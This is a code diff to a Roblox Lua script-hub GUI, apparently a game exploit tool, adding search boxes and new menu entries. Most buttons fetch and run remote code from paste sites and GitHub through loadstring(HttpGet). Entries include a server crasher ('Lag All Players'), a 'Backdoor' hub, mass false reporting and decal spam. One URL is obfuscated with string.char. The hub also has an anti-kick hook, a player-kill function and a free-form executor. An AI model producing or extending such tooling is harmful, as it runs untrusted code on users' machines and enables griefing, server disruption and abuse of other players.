@@ -201,7 +201,7 @@ close.MouseButton1Click:Connect(function()
     gui:Destroy()
 end)
 
--- Minimize button & toggle
+-- Minimize button
 local minimize = Instance.new("TextButton", mainFrame)
 minimize.Size = UDim2.new(0, 30, 0, 30)
 minimize.Position = UDim2.new(1, -75, 0, 5)
@@ -315,10 +315,10 @@ createTabButton("Plugins", 330, function()
     containerPlugins.Visible = true
 end)
 
--- Plugins tab: Full scrolling frame
+-- Plugins tab
 local scrollPlugins = Instance.new("ScrollingFrame", containerPlugins)
-scrollPlugins.Size = UDim2.new(1, -20, 1, -20)
-scrollPlugins.Position = UDim2.new(0, 10, 0, 10)
+scrollPlugins.Size = UDim2.new(1, -20, 1, -50)
+scrollPlugins.Position = UDim2.new(0, 10, 0, 40)
 scrollPlugins.BackgroundTransparency = 1
 scrollPlugins.ScrollBarThickness = 8
 scrollPlugins.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
@@ -333,7 +333,21 @@ pluginLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     scrollPlugins.CanvasSize = UDim2.new(0, 0, 0, pluginLayout.AbsoluteContentSize.Y + 20)
 end)
 
--- Plugin loader
+-- Plugin search box
+local pluginSearch = Instance.new("TextBox", containerPlugins)
+pluginSearch.Size = UDim2.new(1, -20, 0, 30)
+pluginSearch.Position = UDim2.new(0, 10, 0, 5)
+pluginSearch.PlaceholderText = "Search Plugins..."
+pluginSearch.Text = ""
+pluginSearch.Font = Enum.Font.Gotham
+pluginSearch.TextSize = 14
+pluginSearch.TextColor3 = Color3.fromRGB(255, 255, 255)
+pluginSearch.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
+pluginSearch.BorderSizePixel = 0
+pluginSearch.ZIndex = 3
+
+local pluginButtonInstances = {}
+
 local function AddPlugin(name, callback)
     local btn = Instance.new("TextButton", scrollPlugins)
     btn.Size = UDim2.new(1, -20, 0, 40)
@@ -343,7 +357,10 @@ local function AddPlugin(name, callback)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.Gotham
     btn.ZIndex = 2
+    btn.Visible = true
     btn.MouseButton1Click:Connect(callback)
+    table.insert(pluginButtonInstances, {name = name:lower(), button = btn})
+    return btn
 end
 
 local function LoadPlugins()
@@ -374,10 +391,32 @@ if #Plugins > 0 then
     end
 end
 
--- Main tab scrolling frame
+-- Plugin search
+pluginSearch.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local query = pluginSearch.Text:lower()
+        for _, entry in ipairs(pluginButtonInstances) do
+            if query == "" or entry.name:find(query) then
+                entry.button.Visible = true
+            else
+                entry.button.Visible = false
+            end
+        end
+    end
+end)
+
+pluginSearch.Focused:Connect(function()
+    if pluginSearch.Text == "" then
+        for _, entry in ipairs(pluginButtonInstances) do
+            entry.button.Visible = true
+        end
+    end
+end)
+
+-- Main tab scrolling frame + Search
 local scrollMain = Instance.new("ScrollingFrame", containerMain)
-scrollMain.Size = UDim2.new(1, 0, 1, 0)
-scrollMain.Position = UDim2.new(0, 0, 0, 0)
+scrollMain.Size = UDim2.new(1, 0, 1, -40)
+scrollMain.Position = UDim2.new(0, 0, 0, 40)
 scrollMain.BackgroundTransparency = 1
 scrollMain.ScrollBarThickness = 8
 scrollMain.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
@@ -392,6 +431,19 @@ mainLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     scrollMain.CanvasSize = UDim2.new(0, 0, 0, mainLayout.AbsoluteContentSize.Y + 20)
 end)
 
+-- Main search box
+local mainSearch = Instance.new("TextBox", containerMain)
+mainSearch.Size = UDim2.new(1, -20, 0, 30)
+mainSearch.Position = UDim2.new(0, 10, 0, 5)
+mainSearch.PlaceholderText = "Search Scripts..."
+mainSearch.Text = ""
+mainSearch.Font = Enum.Font.Gotham
+mainSearch.TextSize = 14
+mainSearch.TextColor3 = Color3.fromRGB(255, 255, 255)
+mainSearch.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
+mainSearch.BorderSizePixel = 0
+mainSearch.ZIndex = 3
+
 local function createButton(parent, text, callback)
     local btn = Instance.new("TextButton", parent)
     btn.Size = UDim2.new(1, -20, 0, 40)
@@ -401,10 +453,13 @@ local function createButton(parent, text, callback)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.Gotham
     btn.ZIndex = 1
+    btn.Visible = true
     btn.MouseButton1Click:Connect(callback)
+    return btn
 end
 
--- All buttons now in Main tab, alphabetically sorted (A-Z, case-insensitive)
+local mainButtonInstances = {}
+
 local buttons = {
     {"007n7 Decal Spam", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-007n7-decal-spam-Not-FE-26963"))() end},
     {"[Ancient] NasGUI V1.0", function() loadstring(game:HttpGet("https://pastefy.app/P7a8Lj5Y/raw"))() end},
@@ -790,6 +845,15 @@ local buttons = {
     {"J44sGUI by Jan & Nas", function() loadstring(game:HttpGet("https://pastefy.app/zhHfBbeA/raw"))() end},
     {"Lag All Players", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-TOOL-SERVER-CRASHER-30316"))() end},
     {"LALOL Hub Backdoor", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-Hub-Backdoor-58564"))() end},
+    {"Low Ping Server Finder", function()
+        getgenv().MaxAttempts = 10
+        getgenv().RetryDelay = 5
+        getgenv().ServerLimit = 100
+        getgenv().MinPing = math.huge
+        getgenv().PingThreshold = 100
+        getgenv().CommonLoadTime = 10
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/S1mplyn3ss/Roblox/refs/heads/main/src.lua"))()
+    end},
     {"Mass Report Others", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Mass-Report-Others-42251"))() end},
     {"Mobile Shiftlock", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-For-Mobile-Script-36530"))() end},
     {"Modified Ring Parts", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-modified-ring-parts-55157"))() end},
@@ -829,7 +893,8 @@ local buttons = {
         local u = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,111,79,71,76,73,85,90,69,47,114,97,119)
         loadstring(game:HttpGet(u))()
     end},
-    {"NasGUI v1.8 Reborn (LAST INDIE RELEASE)", function() loadstring(game:HttpGet("https://pastefy.app/cFUPaYlc/raw"))() end},
+    {"NasGUI v1.8", function() loadstring(game:HttpGet("https://pastefy.app/cFUPaYlc/raw"))() end},
+    {"NasGUI v2.3 (LAST OFFICIAL OWNERS RELEASE)", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/realNasser9229/NasGUI/refs/heads/main/source.lua", true))() end},
     {"OP Sword Tool", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Linked-Sword-R6-Script-40329"))() end},
     {"Play Song", function()
         local snd = Instance.new("Sound", workspace)
@@ -850,6 +915,73 @@ local buttons = {
     {"SaveInstance V2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universally-saveinstance-V2-42081"))() end},
     {"Secret Service Panel", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Secret-Service-panel-9623"))() end},
     {"Security Cameras", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-Inspired-Camera-Script-17367"))() end},
+    {"Server Hopper Script", function()
+        local TeleportService = game:GetService("TeleportService")
+        local HttpService = game:GetService("HttpService")
+        local Players = game:GetService("Players")
+        local PlaceId = game.PlaceId
+        local Player = Players.LocalPlayer
+
+        local function getServers()
+            local servers = {}
+            local cursor = ""
+            local success, result
+            repeat
+                local url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100&cursor=%s", PlaceId, cursor)
+                success, result = pcall(function()
+                    return HttpService:JSONDecode(game:HttpGet(url))
+                end)
+                if success and result.data then
+                    for _, server in pairs(result.data) do
+                        table.insert(servers, server)
+                    end
+                    cursor = result.nextPageCursor or ""
+                end
+            until not success or cursor == ""
+            return servers
+        end
+
+        local function findBestServer()
+            print("🔍 Searching for servers...")
+            local servers = getServers()
+            if #servers == 0 then warn("❌ No servers found!") return nil end
+
+            table.sort(servers, function(a, b)
+                return a.playing < b.playing
+            end)
+
+            local currentJobId = game.JobId
+            for _, server in pairs(servers) do
+                if server.id ~= currentJobId then
+                    print(string.format("✅ Found server: %d/%d players", server.playing, server.maxPlayers))
+                    return server.id
+                end
+            end
+            return nil
+        end
+
+        local function joinNewServer()
+            print("🚀 Starting server hop...")
+            local serverJobId = findBestServer()
+            if serverJobId then
+                print("📡 Teleporting to new server...")
+                local success, errorMsg = pcall(function()
+                    TeleportService:TeleportToPlaceInstance(PlaceId, serverJobId, Player)
+                end)
+                if not success then
+                    warn("❌ Teleport failed:", errorMsg)
+                    print("🔄 Trying alternative method...")
+                    TeleportService:Teleport(PlaceId, Player)
+                end
+            else
+                warn("❌ Could not find suitable server")
+                print("🔄 Attempting random server teleport...")
+                TeleportService:Teleport(PlaceId, Player)
+            end
+        end
+
+        joinNewServer()
+    end},
     {"ServerHint Message", function()
         local h = Instance.new("Hint", workspace)
         h.Text = "BOW DOWN TO NAS9229ALT & HAXSTER998 CUZ WE PWNED THIS GAME LOL"
@@ -888,6 +1020,13 @@ local buttons = {
         end)
     end},
     {"T0PK3K 5.0", function() loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/3a0464974205a93d31b9f188ace47a53/raw/983b37288a04ce048b9a8cde36fefa0b7564691a/tksrc.lua"))() end},
+    {"The Most Useful Script Hub", function()
+        local scriptblox = "https://github.com/UndetectedTrust/Bread/releases/download/Roblox/lua.file"
+        loadstring(game:HttpGet(scriptblox))()
+    end},
+    {"Unc Test", function()
+        loadstring(game:HttpGet("https://pastefy.app/1D51kveq/raw"))()
+    end},
     {"Universal Anti-Kick (FE)", function()
         local mt = getrawmetatable(game)
         local oldNamecall = mt.__namecall
@@ -929,16 +1068,37 @@ local buttons = {
     {"Walk On Walls", function() loadstring(game:HttpGet("https://rawscripts.net/raw/FE-walk-on-walls_206"))() end}
 }
 
--- Sort alphabetically (case-insensitive)
 table.sort(buttons, function(a, b)
     return a[1]:lower() < b[1]:lower()
 end)
 
 for _, item in ipairs(buttons) do
-    createButton(scrollMain, item[1], item[2])
+    local btn = createButton(scrollMain, item[1], item[2])
+    table.insert(mainButtonInstances, {name = item[1]:lower(), button = btn})
 end
 
--- Executor tab (unchanged)
+mainSearch.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local query = mainSearch.Text:lower()
+        for _, entry in ipairs(mainButtonInstances) do
+            if query == "" or entry.name:find(query) then
+                entry.button.Visible = true
+            else
+                entry.button.Visible = false
+            end
+        end
+    end
+end)
+
+mainSearch.Focused:Connect(function()
+    if mainSearch.Text == "" then
+        for _, entry in ipairs(mainButtonInstances) do
+            entry.button.Visible = true
+        end
+    end
+end)
+
+-- Executor tab (no search)
 local inputBox = Instance.new("TextBox", containerExec)
 inputBox.Size = UDim2.new(1, 0, 0.7, 0)
 inputBox.Position = UDim2.new(0, 0, 0, 0)
@@ -969,7 +1129,7 @@ execButton.MouseButton1Click:Connect(function()
     end)
 end)
 
--- Misc tab - Now only the player & amount sections
+-- Misc tab (no search)
 local scrollMisc = Instance.new("ScrollingFrame", containerMisc)
 scrollMisc.Size = UDim2.new(1, -20, 1, -20)
 scrollMisc.Position = UDim2.new(0, 10, 0, 10)
@@ -998,7 +1158,6 @@ local function findPlayer(name)
     return nil
 end
 
--- Player Target Section
 local playerInput = Instance.new("TextBox", scrollMisc)
 playerInput.Size = UDim2.new(1, -20, 0, 40)
 playerInput.PlaceholderText = "Enter Player Name (partial OK)"
@@ -1095,12 +1254,10 @@ createPlayerButton("Kill Player", function(target)
     end
 end)
 
--- Small spacer
 local spacer1 = Instance.new("Frame", scrollMisc)
 spacer1.Size = UDim2.new(1, 0, 0, 10)
 spacer1.BackgroundTransparency = 1
 
--- Amount Section
 local amountInput = Instance.new("TextBox", scrollMisc)
 amountInput.Size = UDim2.new(1, -20, 0, 40)
 amountInput.PlaceholderText = "Enter Amount"
